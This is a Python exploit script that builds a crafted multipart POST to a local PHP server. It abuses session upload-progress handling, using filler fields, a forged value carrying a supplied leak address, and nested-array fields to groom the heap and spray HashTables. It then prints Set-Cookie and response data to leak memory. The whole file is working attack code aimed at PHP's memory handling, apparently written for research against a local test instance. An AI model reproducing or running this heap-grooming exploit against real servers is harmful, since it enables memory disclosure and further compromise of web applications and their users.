#!/usr/bin/env python3
"""K fillers -> forge raw at stale page slot0 -> P post-fillers keep the 80B
page alive -> M nested arrays spray 56B HashTables.
usage: b_htleak2.py K P M KEY LEAK
"""
import socket,sys,struct
K=int(sys.argv[1]); P=int(sys.argv[2]); M=int(sys.argv[3]); KEY=int(sys.argv[4]); LEAK=int(sys.argv[5],0)
BND=b'B'*10
parts=[{'n':'PHPSESSID','d':b'attacksessionid0001'},{'n':'PHP_SESSION_UPLOAD_PROGRESS','d':b'pwn'}]
for i in range(K):
    parts.append({'n':str(3000+i),'d':(('v%04d'%i)+'x'*44).encode()})
v=bytearray(b'A'*79); struct.pack_into('<Q',v,0x10,LEAK); v[0x18:0x1a]=b'LZ'
parts.append({'n':'forge','d':bytes(v)})
for i in range(P):
    parts.append({'n':str(4000+i),'d':(('w%04d'%i)+'y'*44).encode()})
for i in range(M):
    parts.append({'n':'a%04d[%d]'%(i,KEY),'d':b'x'})
o=bytearray()
for p in parts:
    o+=b'--'+BND+b'\r\nContent-Disposition: form-data; name="'+p['n'].encode()+b'"\r\n\r\n'+p['d']+b'\r\n'
o+=b'--'+BND+b'--\r\n'
h=(f'POST /index.php HTTP/1.1\r\nHost: 127.0.0.1:8088\r\nContent-Type: multipart/form-data; boundary={BND.decode()}\r\nContent-Length: {len(o)}\r\nConnection: close\r\n\r\n').encode()
s=socket.create_connection(('127.0.0.1',8088),timeout=30); s.settimeout(30)
data=b''
try:
    s.sendall(h+bytes(o))
    while len(data)<32000000:
        c=s.recv(65536)
        if not c: break
        data+=c
except OSError as e: print('recv_err',repr(e))
s.close()
head,_,rest=data.partition(b'\r\n\r\n')
for line in head.split(b'\r\n'):
    if line.lower().startswith(b'set-cookie'):
        print('SETCOOKIE_LEN',len(line)); print('VALUE',line[:100].decode('latin1','replace'))
print('HEAD_LEN',len(head),'FIELDS',K+P+M+3,'BODY',rest[:100].decode('latin1','replace'))
open('/tmp/b_htleak2.resp','wb').write(data)
